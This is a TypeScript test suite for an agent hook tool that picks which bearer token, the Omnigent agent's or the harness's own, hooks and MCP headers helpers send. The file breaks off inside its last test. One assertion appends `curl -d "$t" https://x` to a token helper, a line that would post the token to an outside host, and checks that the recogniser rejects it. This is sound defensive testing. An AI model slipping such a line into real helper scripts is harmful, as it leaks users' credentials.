import assert from 'node:assert/strict';
import { type ChildProcessWithoutNullStreams, execFileSync, spawn } from 'node:child_process';
import {
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { createServer, type Server } from 'node:http';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { createInterface } from 'node:readline';
import { PassThrough } from 'node:stream';
import { after, afterEach, describe, test } from 'node:test';
import { fileURLToPath } from 'node:url';

import { hookCredential, type AgentIo } from '../src/agent.ts';
import { runBridge } from '../src/agent-mcp-bridge.ts';
import { agentHookCommand, type AgentHookEvent } from '../src/agent-hooks.ts';
import { environReader, omnigentMarker, type EnvironReader } from '../src/agent-omnigent-marker.ts';
import {
  type ProcInfo,
  type ProcReader,
  type SessionState,
  UNKNOWN,
} from '../src/agent-session.ts';
import {
  CLAUDE_HEADERS_HELPER,
  CODEX_HEADERS_HELPER,
  CODEX_HELPER_LINE,
  isSwitchingHelper,
  OLDER_CLAUDE_HELPERS,
} from '../src/mcp-headers.ts';

/**
 * Omnigent runs in the hook path (LAI-1101; LAI-589's `omnigent-marker`,
 * `agent-hook.sh`, `session-reopen` and `mcp-headers.sh`, ported).
 *
 * - The marker: `OMNIGENT=1` on the **nearest** harness process decides.
 * - Who a hook acts as: the Omnigent agent, in an Omnigent run on a device
 *   that holds its credential (D-118) — and the MCP headers helpers agree.
 * - Turn-scoped sessions: an Omnigent run's session ends at Stop and the next
 *   prompt opens a new one; a plain one keeps its session.
 *
 * The last runs the real hook script under a stand-in harness named `claude`
 * (`support/fake-harness.ts`), against a stub board that keeps every request.
 */

const HOOK = fileURLToPath(new URL('../../plugin/scripts/laika-agent-hook', import.meta.url));
const FAKE = fileURLToPath(new URL('./support/fake-harness.ts', import.meta.url));

const OMNI_TOKEN = 'lai_OMNIGENTagentTOKEN';
const CLAUDE_TOKEN = 'lai_CLAUDEcodeAGENTtoken';

const roots: string[] = [];
const harnesses: ChildProcessWithoutNullStreams[] = [];
const servers: Server[] = [];
afterEach(async () => {
  for (const s of servers.splice(0)) await new Promise<void>((r) => s.close(() => r()));
});
after(() => {
  for (const h of harnesses) if (h.exitCode === null) h.kill('SIGKILL');
  for (const r of roots) {
    // Watchers this test's sessions started.
    try {
      const dir = join(r, 'home', '.laika', 'agent-sessions');
      for (const f of readdirSync(dir).filter((n) => n.endsWith('.json'))) {
        const s = JSON.parse(readFileSync(join(dir, f), 'utf8')) as SessionState;
        if (s.watcher_pid !== undefined) {
          try {
            process.kill(s.watcher_pid, 'SIGKILL');
          } catch {
            // Gone already.
          }
        }
      }
    } catch {
      // No sessions.
    }
    rmSync(r, { recursive: true, force: true });
  }
});

function root(): string {
  const r = mkdtempSync(join(tmpdir(), 'laika-1101-hooks-'));
  roots.push(r);
  return r;
}

function credentials(
  home: string,
  url: string,
  which: readonly ('omnigent' | 'claude-code')[],
): void {
  mkdirSync(join(home, '.laika', 'agents'), { recursive: true });
  for (const h of which) {
    writeFileSync(
      join(home, '.laika', 'agents', `${h}.json`),
      `${JSON.stringify({ url, token: h === 'omnigent' ? OMNI_TOKEN : CLAUDE_TOKEN }, null, 2)}\n`,
      { mode: 0o600 },
    );
  }
}

/**
 * The Claude Code helper an older `tool add` wrote (LAI-1072/1074), verbatim
 * from `master` before LAI-1101: it always reads `claude-code.json`.
 */
const OLD_CLAUDE_HELPER =
  `t="$(sed -n 's/^ *"token": *"\\([^"]*\\)".*/\\1/p' "$HOME/.laika/agents/claude-code.json")" && ` +
  `[ -n "$t" ] && printf '{"Authorization":"Bearer %s"}' "$t"`;

/** `~/.claude.json` with this `mcpServers.laika`, beside another server. */
function claudeJson(home: string, laika: unknown, extra: Record<string, unknown> = {}): void {
  writeFileSync(
    join(home, '.claude.json'),
    `${JSON.stringify({ mcpServers: { other: { type: 'http', url: 'https://x/mcp' }, laika }, ...extra }, null, 2)}\n`,
  );
}

const SWITCHING = (url: string) => ({
  type: 'http',
  url: `${url}/mcp`,
  headersHelper: CLAUDE_HEADERS_HELPER,
});
const OLDER = (url: string) => ({
  type: 'http',
  url: `${url}/mcp`,
  headersHelper: OLD_CLAUDE_HELPER,
});
const PERSONS = (url: string) => ({
  type: 'http',
  url: `${url}/mcp`,
  headers: { Authorization: 'Bearer ${LAIKA_TOKEN}' },
});

function codexToml(home: string, table: string): void {
  mkdirSync(join(home, '.codex'), { recursive: true });
  writeFileSync(join(home, '.codex', 'config.toml'), `model = "o3"\n\n${table}`);
}

/* -------------------------------------------------------------------------- */

const proc =
  (table: Record<number, Omit<ProcInfo, 'pid' | 'started' | 'state'>>): ProcReader =>
  (pid) => {
    const row = table[pid];
    return row === undefined
      ? undefined
      : { pid, started: 'Mon Nov  3 10:00:00 2026', state: 'S', ...row };
  };

void describe('omnigentMarker', () => {
  // hook (node) ← sh ← claude ← python (runner) ← tmux
  const chain = proc({
    500: { ppid: 400, comm: 'node' },
    400: { ppid: 300, comm: 'sh' },
    300: { ppid: 200, comm: 'claude' },
    200: { ppid: 100, comm: 'python3' },
    100: { ppid: 1, comm: 'tmux' },
  });

  void test('OMNIGENT=1 on the nearest harness is Omnigent; its absence is plain', () => {
    const omni: EnvironReader = (pid) => (pid === 300 ? ['HOME=/h', 'OMNIGENT=1'] : ['HOME=/h']);
    assert.equal(omnigentMarker({}, 500, 'codex', chain, omni), 'omnigent');
    const plain: EnvironReader = (pid) => (pid === 300 ? ['HOME=/h'] : ['OMNIGENT=1']);
    // Everything above the harness carries it; only the harness decides.
    assert.equal(omnigentMarker({}, 500, 'codex', chain, plain), 'plain');
  });

  void test('our own OMNIGENT=1 is enough; a named harness PID is read outright', () => {
    assert.equal(
      omnigentMarker(
        { OMNIGENT: '1' },
        500,
        'codex',
        () => UNKNOWN,
        () => undefined,
      ),
      'omnigent',
    );
    const named = proc({ 77: { ppid: 1, comm: 'node' } });
    assert.equal(
      omnigentMarker({ LAIKA_AGENT_HARNESS_PID: '77' }, 500, 'codex', named, (pid) =>
        pid === 77 ? ['OMNIGENT=1'] : [],
      ),
      'omnigent',
    );
  });

  void test('codex counts as a harness too', () => {
    const codex = proc({
      9: { ppid: 8, comm: 'sh' },
      8: { ppid: 1, comm: 'codex-aarch64-apple-darwin' },
    });
    assert.equal(
      omnigentMarker({}, 9, 'codex', codex, (pid) => (pid === 8 ? ['OMNIGENT=1'] : [])),
      'omnigent',
    );
  });

  void test('no harness above, ps failing, or an unreadable environment is unknown', () => {
    assert.equal(
      omnigentMarker({}, 500, 'codex', proc({ 500: { ppid: 1, comm: 'node' } }), () => []),
      'unknown',
    );
    assert.equal(
      omnigentMarker(
        {},
        500,
        'codex',
        () => UNKNOWN,
        () => [],
      ),
      'unknown',
    );
    assert.equal(
      omnigentMarker({}, 500, 'codex', chain, () => undefined),
      'unknown',
    );
  });

  void test('Claude Code: its own environment decides, and the process table is never read', () => {
    const never = (): never => {
      throw new Error('the process table was read for Claude Code');
    };
    assert.equal(omnigentMarker({}, 500, 'claude-code', never, never), 'plain');
    assert.equal(omnigentMarker({ OMNIGENT: '1' }, 500, 'claude-code', never, never), 'omnigent');
  });

  // A Node process, as harnesses are: macOS's `ps -E` shows no environment
  // for a platform binary such as /bin/sleep or /bin/sh (measured), and a
  // harness never is one — `claude`, `codex` and Homebrew's `node` all read.
  const idle = async (env: Record<string, string>, args: readonly string[] = []) => {
    const child = spawn(
      process.execPath,
      ['-e', 'process.stdout.write("up\\n"); setInterval(() => {}, 1000)', ...args],
      {
        env: { PATH: '/usr/bin:/bin', ...env },
      },
    );
    await new Promise<void>((resolve) => child.stdout.once('data', () => resolve()));
    return child;
  };

  void test('the environment reader sees a real process’s OMNIGENT=1', async () => {
    const child = await idle({ OMNIGENT: '1' });
    try {
      assert.ok((environReader()(child.pid ?? 0) ?? []).includes('OMNIGENT=1'));
    } finally {
      child.kill('SIGKILL');
    }
    const plain = await idle({});
    try {
      const words = environReader()(plain.pid ?? 0);
      assert.ok(words !== undefined, 'the environment could not be read at all');
      assert.ok(!words.includes('OMNIGENT=1'));
    } finally {
      plain.kill('SIGKILL');
    }
  });

  void test('a word OMNIGENT=1 in the arguments is not an environment entry (review #1)', async () => {
    const child = await idle({ FOO: 'bar' }, ['OMNIGENT=1', 'x']);
    try {
      const entries = environReader()(child.pid ?? 0);
      assert.ok(entries !== undefined, 'the environment could not be read at all');
      assert.ok(entries.includes('FOO=bar'), JSON.stringify(entries));
      assert.ok(!entries.includes('OMNIGENT=1'), 'an argument was read as the marker');
      assert.ok(!entries.includes('x'), 'the arguments were read as entries');
    } finally {
      child.kill('SIGKILL');
    }
  });
});

/* -------------------------------------------------------------------------- */

void describe('hookCredential — hooks and MCP speak as one agent (D-118, review B1)', () => {
  const io = (home: string): AgentIo => ({
    out: () => undefined,
    err: () => undefined,
    home,
    env: { LAIKA_AGENT_TOKEN: 'lai_FROMtheENVIRONMENT' },
    stdin: () => '',
    isTTY: false,
  });
  const URL_ = 'http://board.test';
  const own = 'lai_FROMtheENVIRONMENT';

  void test('B1: Claude Code whose MCP is the switching helper — an Omnigent run is the Omnigent agent', () => {
    const home = join(root(), 'home');
    credentials(home, URL_, ['omnigent', 'claude-code']);
    claudeJson(home, SWITCHING(URL_));
    assert.equal(
      hookCredential(io(home), 'claude-code', () => 'omnigent', home)?.token,
      OMNI_TOKEN,
    );
    // A plain run keeps the harness's own rule, environment token included.
    assert.equal(hookCredential(io(home), 'claude-code', () => 'plain', home)?.token, own);
    assert.equal(
      hookCredential(io(home), 'claude-code', () => 'unknown', home),
      undefined,
    );
  });

  void test('B1: Claude Code whose MCP is the older tool-add helper keeps its own credential in an Omnigent run', () => {
    const home = join(root(), 'home');
    credentials(home, URL_, ['omnigent', 'claude-code']);
    claudeJson(home, OLDER(URL_));
    let asked = 0;
    const verdict = () => {
      asked += 1;
      return 'omnigent' as const;
    };
    assert.equal(hookCredential(io(home), 'claude-code', verdict, home)?.token, own);
    assert.equal(asked, 0, 'the run was asked about although the MCP cannot follow it');
  });

  void test('B1: Claude Code whose MCP is a person-written laika entry keeps its own credential', () => {
    const home = join(root(), 'home');
    credentials(home, URL_, ['omnigent', 'claude-code']);
    claudeJson(home, PERSONS(URL_));
    assert.equal(hookCredential(io(home), 'claude-code', () => 'omnigent', home)?.token, own);
    // And with no laika entry at all.
    claudeJson(home, undefined);
    assert.equal(hookCredential(io(home), 'claude-code', () => 'omnigent', home)?.token, own);
  });

  void test('B1: a nearer laika server — local scope or a project .mcp.json — overrides the switching one', () => {
    const home = join(root(), 'home');
    credentials(home, URL_, ['omnigent', 'claude-code']);
    const repo = join(home, 'repo');
    const deep = join(repo, 'src', 'lib');
    mkdirSync(deep, { recursive: true });
    claudeJson(home, SWITCHING(URL_), {
      projects: { [repo]: { mcpServers: { laika: PERSONS(URL_) } } },
    });
    assert.equal(hookCredential(io(home), 'claude-code', () => 'omnigent', deep)?.token, own);
    claudeJson(home, SWITCHING(URL_));
    assert.equal(
      hookCredential(io(home), 'claude-code', () => 'omnigent', deep)?.token,
      OMNI_TOKEN,
    );
    writeFileSync(
      join(repo, '.mcp.json'),
      JSON.stringify({ mcpServers: { laika: PERSONS(URL_) } }),
    );
    assert.equal(hookCredential(io(home), 'claude-code', () => 'omnigent', deep)?.token, own);
  });

  void test('B1: Codex — only the switching table follows; the older table and a person’s keep its own', () => {
    const home = join(root(), 'home');
    credentials(home, URL_, ['omnigent']);
    writeFileSync(
      join(home, '.laika', 'agents', 'codex.json'),
      `${JSON.stringify({ url: URL_, token: 'lai_CODEXownTOKEN' })}\n`,
    );
    const codexIo: AgentIo = { ...io(home), env: {} };
    codexToml(home, `[mcp_servers.laika]\nurl = "${URL_}/mcp"\n${CODEX_HELPER_LINE}\n`);
    assert.equal(hookCredential(codexIo, 'codex', () => 'omnigent', home)?.token, OMNI_TOKEN);
    codexToml(
      home,
      `[mcp_servers.laika]\nurl = "${URL_}/mcp"\nbearer_token_env_var = "LAIKA_AGENT_TOKEN_CODEX"\n`,
    );
    assert.equal(
      hookCredential(codexIo, 'codex', () => 'omnigent', home)?.token,
      'lai_CODEXownTOKEN',
    );
    codexToml(
      home,
      `[mcp_servers.laika]\nurl = "${URL_}/mcp"\n${CODEX_HELPER_LINE}\nbearer_token_env_var = "LAIKA_TOKEN"\n`,
    );
    assert.equal(
      hookCredential(codexIo, 'codex', () => 'omnigent', home)?.token,
      'lai_CODEXownTOKEN',
    );
  });

  void test('no Omnigent credential: the harness’s own, and the run is never asked about', () => {
    const home = join(root(), 'home');
    credentials(home, URL_, ['claude-code']);
    claudeJson(home, SWITCHING(URL_));
    let asked = 0;
    const verdict = () => {
      asked += 1;
      return 'omnigent' as const;
    };
    assert.equal(hookCredential(io(home), 'claude-code', verdict, home)?.token, own);
    assert.equal(asked, 0);
  });
});

/* -------------------------------------------------------------------------- */

/** Run a headers helper the way its tool does: a shell, under a parent whose environment we choose. */
function runHelper(
  helper: string,
  home: string,
  parentEnv: Record<string, string>,
  ownEnv: Record<string, string>,
  parentArgs: readonly string[] = [],
): Promise<{ code: number | null; out: string }> {
  return new Promise((resolve) => {
    // The parent stands in for the tool: a Node process holding `parentEnv`
    // (a harness, not a platform binary, so `ps -E` can read it), which runs
    // the helper through `sh -c` with exactly `ownEnv` — as Codex does with
    // its allowlist.
    const parent =
      'const r = require("node:child_process").spawnSync("/bin/sh", ["-c", process.env.HELPER], ' +
      '{ env: JSON.parse(process.env.INNER), stdio: "inherit" }); process.exit(r.status ?? 1);';
    const child = spawn(process.execPath, ['-e', parent, ...parentArgs], {
      env: {
        PATH: '/usr/bin:/bin',
        HELPER: helper,
        INNER: JSON.stringify({ HOME: home, PATH: '/usr/bin:/bin', ...ownEnv }),
        ...parentEnv,
      },
    });
    let out = '';
    child.stdout.on('data', (c: Buffer) => (out += c.toString('utf8')));
    child.on('close', (code) => resolve({ code, out }));
  });
}

void describe('the MCP headers helpers agree with the hooks', () => {
  const setUp = () => {
    const home = join(root(), 'home');
    mkdirSync(join(home, '.laika', 'agents'), { recursive: true });
    for (const name of ['claude-code', 'codex']) {
      writeFileSync(
        join(home, '.laika', 'agents', `${name}.json`),
        `{\n  "url": "http://b",\n  "token": "lai_OWN${name}"\n}\n`,
      );
    }
    const omnigent = () =>
      writeFileSync(
        join(home, '.laika', 'agents', 'omnigent.json'),
        `{\n  "url": "http://b",\n  "token": "${OMNI_TOKEN}"\n}\n`,
      );
    return { home, omnigent };
  };
  const bearer = async (
    helper: string,
    home: string,
    parent: Record<string, string>,
    ownEnv: Record<string, string>,
    parentArgs: readonly string[] = [],
  ): Promise<string> => {
    const r = await runHelper(helper, home, parent, ownEnv, parentArgs);
    assert.equal(r.code, 0, `the helper failed: ${r.out}`);
    return (JSON.parse(r.out) as { Authorization: string }).Authorization;
  };

  void test('Claude Code: its own OMNIGENT decides, as the hooks’ does', async () => {
    const { home, omnigent } = setUp();
    const own = 'Bearer lai_OWNclaude-code';
    // No Omnigent credential here: always the tool's own.
    assert.equal(
      await bearer(CLAUDE_HEADERS_HELPER, home, { OMNIGENT: '1' }, { OMNIGENT: '1' }),
      own,
    );
    omnigent();
    assert.equal(await bearer(CLAUDE_HEADERS_HELPER, home, {}, {}), own);
    assert.equal(
      await bearer(CLAUDE_HEADERS_HELPER, home, {}, { OMNIGENT: '1' }),
      `Bearer ${OMNI_TOKEN}`,
    );
    // Claude Code passes its environment through: a parent's alone is not it.
    assert.equal(await bearer(CLAUDE_HEADERS_HELPER, home, { OMNIGENT: '1' }, {}), own);
  });

  void test('Codex: the parent’s environment decides — an entry, never an argument (review #1)', async () => {
    const { home, omnigent } = setUp();
    const own = 'Bearer lai_OWNcodex';
    assert.equal(await bearer(CODEX_HEADERS_HELPER, home, { OMNIGENT: '1' }, {}), own);
    omnigent();
    assert.equal(await bearer(CODEX_HEADERS_HELPER, home, {}, {}), own);
    // Codex's allowlist strips it from the helper: the parent's counts.
    assert.equal(
      await bearer(CODEX_HEADERS_HELPER, home, { OMNIGENT: '1' }, {}),
      `Bearer ${OMNI_TOKEN}`,
    );
    // An argument that reads OMNIGENT=1 is not the environment.
    assert.equal(await bearer(CODEX_HEADERS_HELPER, home, {}, {}, ['OMNIGENT=1']), own);
  });

  void test('Codex: when the parent’s environment cannot be read it prints nothing and fails (review #2)', async () => {
    const { home, omnigent } = setUp();
    // A PATH with sed and nothing to read a process with: no tr, no ps, no grep.
    const bin = join(root(), 'bin');
    mkdirSync(bin);
    const sed = execFileSync('/bin/sh', ['-c', 'command -v sed'], { encoding: 'utf8' }).trim();
    symlinkSync(sed, join(bin, 'sed'));
    // The helper works on that PATH where nothing needs telling.
    assert.equal(
      await bearer(CODEX_HEADERS_HELPER, home, { OMNIGENT: '1' }, { PATH: bin }),
      'Bearer lai_OWNcodex',
    );
    omnigent();
    const r = await runHelper(CODEX_HEADERS_HELPER, home, { OMNIGENT: '1' }, { PATH: bin });
    assert.equal(r.out, '', 'a token was sent although the run could not be told');
    assert.notEqual(r.code, 0);
  });
});

void describe('the switching helper, pinned and recognised by its shape (review round 2, N4)', () => {
  void test('its exact text is pinned: an edit to it is a deliberate one', () => {
    assert.equal(
      CLAUDE_HEADERS_HELPER,
      'p="$HOME/.laika/agents/claude-code.json"; o="$HOME/.laika/agents/omnigent.json"; ' +
        'if [ "${OMNIGENT:-}" = 1 ] && [ -r "$o" ]; then p="$o"; fi; ' +
        `t="$(sed -n 's/^ *"token": *"\\([^"]*\\)".*/\\1/p' "$p")" && ` +
        `[ -n "$t" ] && printf '{"Authorization":"Bearer %s"}' "$t"`,
    );
    assert.equal(
      CODEX_HEADERS_HELPER,
      'p="$HOME/.laika/agents/codex.json"; o="$HOME/.laika/agents/omnigent.json"; ' +
        'if [ -r "$o" ]; then ' +
        `if e="$(tr '\\0' '\\n' 2>/dev/null < "/proc/$PPID/environ")"; then :; ` +
        'else a="$(ps -ww -o command= -p "$PPID" 2>/dev/null)" && ' +
        'f="$(ps -E -ww -o command= -p "$PPID" 2>/dev/null)" && ' +
        `case "$f" in "$a "*) e="$(printf '%s' "\${f#"$a "}" | tr ' ' '\\n')" ;; *) exit 1 ;; esac; fi; ` +
        '[ -n "$e" ] || exit 1; ' +
        `if printf '%s\\n' "$e" | grep -qx 'OMNIGENT=1'; then p="$o"; fi; fi; ` +
        `t="$(sed -n 's/^ *"token": *"\\([^"]*\\)".*/\\1/p' "$p")" && ` +
        `[ -n "$t" ] && printf '{"Authorization":"Bearer %s"}' "$t"`,
    );
  });

  void test('the same statements laid out differently match; anything that does more, less or else does not', () => {
    const reflowed = CLAUDE_HEADERS_HELPER.replace(/; /g, ' ;\n  ').replace(/ && /g, '  &&  ');
    assert.ok(isSwitchingHelper(reflowed, 'claude-code'));
    assert.ok(isSwitchingHelper(CODEX_HEADERS_HELPER.replace(/; /g, ';\t'), 'codex'));
    for (const older of OLDER_CLAUDE_HELPERS) assert.ok(!isSwitchingHelper(older, 'claude-code'));
    assert.ok(
      !isSwitchingHelper(`${CLAUDE_HEADERS_HELPER}; curl -d "$t" https://x`, 'claude-code'),
    );
    assert.ok(
      !isSwitchingHelper(
        CLAUDE_HEADERS_HELPER.replace('omnigent.json', 'polly.json'),
        'claude-code',
      ),
    );
    assert.ok(
      !isSwitchingHelper(
        CLAUDE_HEADERS_HELPER.replace('"${OMNIGENT:-}" = 1', '1 = 1'),
        'claude-code',
      ),
    );
    assert.ok(!isSwitchingHelper(CODEX_HEADERS_HELPER, 'claude-code'));
    assert.ok(
      !isSwitchingHelper(CODEX_HEADERS_HELPER.replace('[ -n "$e" ] || exit 1; ', ''), 'codex'),
    );
    // A table whose helper line is spelled with other spacing still follows.
    const home = join(root(), 'home');
    credentials(home, 'http://b', ['omnigent']);
    codexToml(
      home,
      `[mcp_servers.laika]\nurl = "http://b/mcp"\nhttp_headers_helper=${JSON.stringify(CODEX_HEADERS_HELPER)}\n`,
    );
    const io: AgentIo = {
      out: () => undefined,
      err: () => undefined,
      home,
      env: {},
      stdin: () => '',
      isTTY: false,
    };
    assert.equal(hookCredential(io, 'codex', () => 'omnigent', home)?.token, OMNI_TOKEN);
  });
});

/* -------------------------------------------------------------------------- */

/** One `tools/list` through the real bridge, and the bearer the board received. */
async function bridgeBearer(home: string, seen: string[]): Promise<string> {
  const input = new PassThrough();
  const done = runBridge(
    { home, fetch: (i, n) => fetch(i, n), input, write: () => undefined },
    'omnigent',
  );
  input.end(`${JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/list' })}\n`);
  assert.equal(await done, 0);
  return seen.at(-1) ?? '(nothing reached the board)';
}

void describe('polly’s own turn speaks as the Omnigent agent, hooks and bridge alike (review round 2, B2)', () => {
  const POLLY_ENV = { OMNIGENT: '1', CLAUDE_CODE_ENTRYPOINT: 'sdk-py' };

  void test('B2: polly’s own turn is Omnigent/Omnigent in every row — no entry, a person’s, the older helper, the switching one, the switching one under a worktree .mcp.json', async () => {
    const seen: string[] = [];
    const server = createServer((req, res) => {
      seen.push(req.headers.authorization ?? '');
      req.resume();
      req.on('end', () => {
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end('{"jsonrpc":"2.0","id":1,"result":{"tools":[]}}');
      });
    });
    servers.push(server);
    await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
    const a = server.address();
    const url = `http://127.0.0.1:${String(typeof a === 'object' && a !== null ? a.port : 0)}`;

    const rows: [string, (home: string) => string][] = [
      ['no laika entry', (home) => (claudeJson(home, undefined), home)],
      ['a person’s entry', (home) => (claudeJson(home, PERSONS(url)), home)],
      ['the older tool-add helper', (home) => (claudeJson(home, OLDER(url)), home)],
      ['the switching helper', (home) => (claudeJson(home, SWITCHING(url)), home)],
      [
        'the switching helper, cwd in a worktree whose .mcp.json defines laika',
        (home) => {
          claudeJson(home, SWITCHING(url));
          const wt = join(home, 'wt');
          mkdirSync(join(wt, 'src'), { recursive: true });
          writeFileSync(
            join(wt, '.mcp.json'),
            JSON.stringify({ mcpServers: { laika: PERSONS(url) } }),
          );
          return join(wt, 'src');
        },
      ],
    ];
    for (const [row, setUp] of rows) {
      const home = join(root(), 'home');
      credentials(home, url, ['omnigent', 'claude-code']);
      const cwd = setUp(home);
      const io: AgentIo = {
        out: () => undefined,
        err: () => undefined,
        home,
        env: POLLY_ENV,
        stdin: () => '',
        isTTY: false,
      };
      assert.equal(
        hookCredential(io, 'claude-code', () => 'omnigent', cwd)?.token,
        OMNI_TOKEN,
        `${row}: hook`,
      );
      assert.equal(await bridgeBearer(home, seen), `Bearer ${OMNI_TOKEN}`, `${row}: bridge`);
    }
  });

  void test('B2: a worker in the same rows keeps the B1 rule — only the switching helper follows', () => {
    const home = join(root(), 'home');
    credentials(home, 'http://b', ['omnigent', 'claude-code']);
    const worker: AgentIo = {
      out: () => undefined,
      err: () => undefined,
      home,
      env: { OMNIGENT: '1', CLAUDE_CODE_ENTRYPOINT: 'cli' },
      stdin: () => '',
      isTTY: false,
    };
    claudeJson(home, PERSONS('http://b'));
    assert.equal(
      hookCredential(worker, 'claude-code', () => 'omnigent', home)?.token,
      CLAUDE_TOKEN,
    );
    claudeJson(home, SWITCHING('http://b'));
    assert.equal(hookCredential(worker, 'claude-code', () => 'omnigent', home)?.token, OMNI_TOKEN);
    // And off an Omnigent device polly's turn is nothing special.
    rmSync(join(home, '.laika', 'agents', 'omnigent.json'));
    const polly: AgentIo = { ...worker, env: POLLY_ENV };
    assert.equal(hookCredential(polly, 'claude-code', () => 'omnigent', home)?.token, CLAUDE_TOKEN);
  });
});

void describe('the effective entry: CLAUDE_CONFIG_DIR and CODEX_HOME (review round 2, N3)', () => {
  const ioWith = (home: string, env: Record<string, string>): AgentIo => ({
    out: () => undefined,
    err: () => undefined,
    home,
    env,
    stdin: () => '',
    isTTY: false,
  });

  void test('Claude Code under CLAUDE_CONFIG_DIR reads that directory’s .claude.json, not ~/.claude.json', () => {
    const home = join(root(), 'home');
    credentials(home, 'http://b', ['omnigent', 'claude-code']);
    const dir = join(home, '.claude-work');
    mkdirSync(dir);
    claudeJson(home, PERSONS('http://b'));
    writeFileSync(
      join(dir, '.claude.json'),
      JSON.stringify({ mcpServers: { laika: SWITCHING('http://b') } }),
    );
    const io = ioWith(home, { CLAUDE_CONFIG_DIR: dir });
    assert.equal(hookCredential(io, 'claude-code', () => 'omnigent', home)?.token, OMNI_TOKEN);
    // The other way round.
    claudeJson(home, SWITCHING('http://b'));
    writeFileSync(
      join(dir, '.claude.json'),
      JSON.stringify({ mcpServers: { laika: PERSONS('http://b') } }),
    );
    assert.equal(hookCredential(io, 'claude-code', () => 'omnigent', home)?.token, CLAUDE_TOKEN);
  });

  void test('Codex under CODEX_HOME (Omnigent’s private copy) reads that config.toml, not ~/.codex’s', () => {
    const home = join(root(), 'home');
    credentials(home, 'http://b', ['omnigent']);
    writeFileSync(
      join(home, '.laika', 'agents', 'codex.json'),
      `${JSON.stringify({ url: 'http://b', token: 'lai_CODEXownTOKEN' })}\n`,
    );
    const copy = join(home, 'omnigent-codex-home');
    mkdirSync(copy);
    // ~/.codex was switched; the running conversation's copy was taken before.
    codexToml(home, `[mcp_servers.laika]\nurl = "http://b/mcp"\n${CODEX_HELPER_LINE}\n`);
    writeFileSync(
      join(copy, 'config.toml'),
      '[mcp_servers.laika]\nurl = "http://b/mcp"\nbearer_token_env_var = "LAIKA_AGENT_TOKEN_CODEX"\n',
    );
    const io = ioWith(home, { CODEX_HOME: copy });
    assert.equal(hookCredential(io, 'codex', () => 'omnigent', home)?.token, 'lai_CODEXownTOKEN');
    writeFileSync(
      join(copy, 'config.toml'),
      `[mcp_servers.laika]\nurl = "http://b/mcp"\n${CODEX_HELPER_LINE}\n`,
    );
    assert.equal(hookCredential(io, 'codex', () => 'omnigent', home)?.token, OMNI_TOKEN);
  });
});

/* -------------------------------------------------------------------------- */

interface Board {
  readonly url: string;
  readonly requests: { method: string; path: string; auth: string }[];
}

let ids = 0;
const ulid = (): string => `01M6000000000000000000${String(1000 + (ids += 1))}`.slice(0, 26);

async function stubBoard(): Promise<Board> {
  const requests: Board['requests'] = [];
  const server = createServer((req, res) => {
    req.resume();
    req.on('end', () => {
      const path = (req.url ?? '').split('?')[0] ?? '';
      requests.push({ method: req.method ?? '', path, auth: req.headers.authorization ?? '' });
      const json = (status: number, body: unknown): void => {
        res.writeHead(status, { 'content-type': 'application/json' });
        res.end(JSON.stringify(body));
      };
      if (req.method === 'POST' && path === '/api/v1/agent-sessions') {
        json(201, { id: ulid(), agent_id: '01M635B62FE71AN9FXEZEJW9ND' });
      } else if (req.method === 'POST' && path.endsWith('/heartbeat')) {
        json(200, { session: {}, claims: [], lost: [] });
      } else if (req.method === 'POST' && path.endsWith('/end')) {
        json(200, { end_reason: 'ended' });
      } else {
        json(404, { error: { code: 'not_found', message: 'not_found', details: null } });
      }
    });
  });
  servers.push(server);
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
  const a = server.address();
  return {
    url: `http://127.0.0.1:${String(typeof a === 'object' && a !== null ? a.port : 0)}`,
    requests,
  };
}

interface Harness {
  run(
    event: AgentHookEvent,
    sessionId: string,
    cwd?: string,
  ): Promise<{ stdout: string; code: number }>;
}

function startHarness(home: string, bin: string, extra: Record<string, string>): Harness {
  const child = spawn(join(bin, 'claude'), [FAKE], {
    stdio: ['pipe', 'pipe', 'pipe'],
    env: {
      PATH: `${dirname(process.execPath)}:/usr/bin:/bin`,
      HOME: home,
      LAIKA_AGENT_HEARTBEAT_SECONDS: '600',
      LAIKA_AGENT_EVENTS: 'off',
      ...extra,
    },
  });
  harnesses.push(child);
  const answers = createInterface({ input: child.stdout });
  const queue: ((line: string) => void)[] = [];
  answers.on('line', (line) => queue.shift()?.(line));
  const names: Record<AgentHookEvent, string> = {
    'session-start': 'SessionStart',
    prompt: 'UserPromptSubmit',
    'pre-tool': 'PreToolUse',
    tool: 'PostToolUse',
    'tool-failed': 'PostToolUseFailure',
    stop: 'Stop',
    'session-end': 'SessionEnd',
  };
  return {
    run: (event, sessionId, cwd = home) =>
      new Promise((resolve) => {
        queue.push((line) => resolve(JSON.parse(line) as { stdout: string; code: number }));
        const payload = JSON.stringify({
          session_id: sessionId,
          hook_event_name: names[event],
          cwd,
          ...(event === 'session-start' ? { source: 'startup' } : {}),
        });
        child.stdin.write(
          `${JSON.stringify({ command: agentHookCommand(HOOK, event, 'claude-code'), payload })}\n`,
        );
      }),
  };
}

async function until<T>(what: string, probe: () => T | undefined, ms = 10_000): Promise<T> {
  const end = Date.now() + ms;
  for (;;) {
    const v = probe();
    if (v !== undefined) return v;
    if (Date.now() > end) throw new Error(`timed out waiting for ${what}`);
    await new Promise((r) => setTimeout(r, 100));
  }
}

const stateOf = (home: string, id: string): SessionState =>
  JSON.parse(
    readFileSync(join(home, '.laika', 'agent-sessions', `claude-code-${id}.json`), 'utf8'),
  ) as SessionState;

void describe('an Omnigent run through the real hook', () => {
  void test('opens as the Omnigent agent, ends at Stop, and the next prompt opens a new session', async () => {
    const r = root();
    const home = join(r, 'home');
    const bin = join(r, 'bin');
    mkdirSync(bin);
    symlinkSync(process.execPath, join(bin, 'claude'));
    const board = await stubBoard();
    credentials(home, board.url, ['omnigent', 'claude-code']);
    claudeJson(home, SWITCHING(board.url));
    const h = startHarness(home, bin, { OMNIGENT: '1' });

    const started = await h.run('session-start', 'omni-1');
    assert.equal(started.code, 0);
    const first = stateOf(home, 'omni-1');
    assert.equal(first.status, 'live');
    const starts = () => board.requests.filter((q) => q.path === '/api/v1/agent-sessions');
    assert.equal(starts().length, 1);
    assert.equal(
      starts()[0]?.auth,
      `Bearer ${OMNI_TOKEN}`,
      'the session did not open as the Omnigent agent',
    );
